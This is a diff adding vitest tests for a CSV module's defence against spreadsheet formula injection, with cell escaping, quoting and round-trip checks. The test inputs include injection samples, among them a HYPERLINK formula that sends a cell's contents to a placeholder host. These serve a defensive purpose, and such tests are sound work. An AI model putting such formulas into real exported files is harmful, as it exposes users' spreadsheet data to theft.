@@ -1,5 +1,5 @@
 import { describe, expect, it } from 'vitest';
-import { parseCsv, toCsv } from './csv';
+import { parseCsv, safeCell, toCsv, unguardCell } from './csv';
 
 describe('parseCsv', () => {
 	it('reads plain rows, one per record, blank ones included', () => {
@@ -47,5 +47,32 @@ describe('parseCsv', () => {
 			['Heater', '']
 		];
 		expect(parseCsv(toCsv(rows))).toEqual(rows);
+	});
+});
+
+describe('cells of typed text, for a file opened in a spreadsheet (#221)', () => {
+	it('keeps a cell from running as a formula, and leaves numbers and ordinary text alone', () => {
+		expect(safeCell('=1+1')).toBe("'=1+1");
+		expect(safeCell('+1 fish')).toBe("'+1 fish");
+		expect(safeCell('@SUM(A1)')).toBe("'@SUM(A1)");
+		expect(safeCell('-cmd')).toBe("'-cmd");
+		expect(safeCell('=HYPERLINK("http://x/?"&A1,"x")')).toBe(`"'=HYPERLINK(""http://x/?""&A1,""x"")"`);
+		expect(safeCell('-0.5')).toBe('-0.5');
+		expect(safeCell('7.2')).toBe('7.2');
+		expect(safeCell('Before the water change')).toBe('Before the water change');
+		expect(safeCell('')).toBe('');
+	});
+
+	it('quotes a bare return, a comma and a quote', () => {
+		expect(safeCell('one\rtwo')).toBe('"one\rtwo"');
+		expect(safeCell('a, b')).toBe('"a, b"');
+		expect(safeCell('say "hi"')).toBe(`"say ""hi"""`);
+	});
+
+	it('comes back as it was typed', () => {
+		for (const typed of ['=1+1', '+1 fish', '@home', '-cmd', "'quoted'", "it's fine", '-0.5', 'plain']) {
+			const [[cell]] = parseCsv(safeCell(typed) + '\n');
+			expect(unguardCell(cell)).toBe(typed);
+		}
 	});
 });
